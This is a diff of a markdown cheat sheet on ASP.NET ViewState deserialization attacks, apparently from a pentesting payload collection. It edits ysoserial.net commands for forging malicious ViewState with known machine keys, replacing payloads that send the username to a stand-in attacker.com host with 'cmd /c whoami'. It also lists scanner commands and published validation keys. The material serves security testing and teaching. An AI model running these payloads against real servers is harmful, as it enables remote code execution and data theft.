@@ -98,8 +98,8 @@ Try multiple machine keys from known products, Microsoft documentation, or other
     python3 ./crapsecrets/examples/cli.py -u http://update.microsoft.com/ -r
     python3 ./crapsecrets/examples/cli.py -u http://update.microsoft.com/ -mrd 5
     python3 ./crapsecrets/examples/cli.py -mrd 5 -avsk -fvsp -u http://update.microsoft.com/
-    python3 ./crapsecrets/examples/cli.py -mrd 5 -avsk -fvsp -mkf ./local/aspnet_machinekeys_local.txt -u http://192.168.6.22:8080/
-    python3 ./crapsecrets/examples/cli.py -mrd 5 -avsk -fvsp -mkf ./local/aspnet_machinekeys_local.txt -mkf ./crapsecrets/resources/aspnet_machinekeys.txt -u http://192.168.6.22:8080/a1/b/c1/
+    python3 ./crapsecrets/examples/cli.py -mrd 5 -avsk -fvsp -mkf ./local/aspnet_machinekeys_local.txt -u http://10.10.10.10:8080/
+    python3 ./crapsecrets/examples/cli.py -mrd 5 -avsk -fvsp -mkf ./local/aspnet_machinekeys_local.txt -mkf ./crapsecrets/resources/aspnet_machinekeys.txt -u http://10.10.10.10:8080/a1/b/c1/
     ```
 
 * [NotSoSecure/Blacklist3r](https://github.com/NotSoSecure/Blacklist3r)
@@ -143,7 +143,7 @@ First you need to decode the Viewstate to know if the MAC and the encryption are
 ### MAC Is Not Enabled
 
 ```ps1
-ysoserial.exe -o base64 -g TypeConfuseDelegate -f ObjectStateFormatter -c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/:UserName"
+ysoserial.exe -o base64 -g TypeConfuseDelegate -f ObjectStateFormatter -c "cmd /c whoami"
 ```
 
 ### MAC Is Enabled And Encryption Is Disabled
@@ -159,8 +159,8 @@ ysoserial.exe -o base64 -g TypeConfuseDelegate -f ObjectStateFormatter -c "power
 * Then generate a ViewState using [pwntester/ysoserial.net](https://github.com/pwntester/ysoserial.net), both `TextFormattingRunProperties` and `TypeConfuseDelegate` gadgets can be used.
 
     ```ps1
-    .\ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/:UserName" --generator=CA0B0334 --validationalg="SHA1" --validationkey="C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45"
-    .\ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "powershell.exe -c nslookup http://attacker.com" --generator=3E92B2D6 --validationalg="SHA1" --validationkey="C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45"
+    .\ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "cmd /c whoami" --generator=CA0B0334 --validationalg="SHA1" --validationkey="C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45"
+    .\ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "cmd /c whoami" --generator=3E92B2D6 --validationalg="SHA1" --validationkey="C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45"
 
     # --generator = `__VIEWSTATEGENERATOR` parameter value
     # --validationkey = validation key from the previous command
@@ -175,13 +175,13 @@ If the `__VIEWSTATEGENERATOR` is missing but the application uses .NET Framework
 * **.NET Framework < 4.5**, ASP.NET always accepts an unencrypted `__VIEWSTATE` if you remove the `__VIEWSTATEENCRYPTED` parameter from the request
 
     ```ps1
-    .\ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "echo 123 > c:\windows\temp\test.txt" --apppath="/testaspx/" --islegacy --validationalg="SHA1" --validationkey="70DBADBFF4B7A13BE67DD0B11B177936F8F3C98BCE2E0A4F222F7A769804D451ACDB196572FFF76106F33DCEA1571D061336E68B12CF0AF62D56829D2A48F1B0" --isdebug
+    .\ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "cmd /c whoami" --apppath="/testaspx/" --islegacy --validationalg="SHA1" --validationkey="70DBADBFF4B7A13BE67DD0B11B177936F8F3C98BCE2E0A4F222F7A769804D451ACDB196572FFF76106F33DCEA1571D061336E68B12CF0AF62D56829D2A48F1B0" --isdebug
     ```
 
 * **.NET Framework > 4.5**, the machineKey has the property: `compatibilityMode="Framework45"`
 
     ```ps1
-    .\ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "echo 123 > c:\windows\temp\test.txt" --path="/somepath/testaspx/test.aspx" --apppath="/testaspx/" --decryptionalg="AES" --decryptionkey="34C69D15ADD80DA4788E6E3D02694230CF8E9ADFDA2708EF43CAEF4C5BC73887" --validationalg="HMACSHA256" --validationkey="70DBADBFF4B7A13BE67DD0B11B177936F8F3C98BCE2E0A4F222F7A769804D451ACDB196572FFF76106F33DCEA1571D061336E68B12CF0AF62D56829D2A48F1B0"
+    .\ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "cmd /c whoami" --path="/somepath/testaspx/test.aspx" --apppath="/testaspx/" --decryptionalg="AES" --decryptionkey="34C69D15ADD80DA4788E6E3D02694230CF8E9ADFDA2708EF43CAEF4C5BC73887" --validationalg="HMACSHA256" --validationkey="70DBADBFF4B7A13BE67DD0B11B177936F8F3C98BCE2E0A4F222F7A769804D451ACDB196572FFF76106F33DCEA1571D061336E68B12CF0AF62D56829D2A48F1B0"
     ```
 
 ## Edit Cookies With The Machine Key
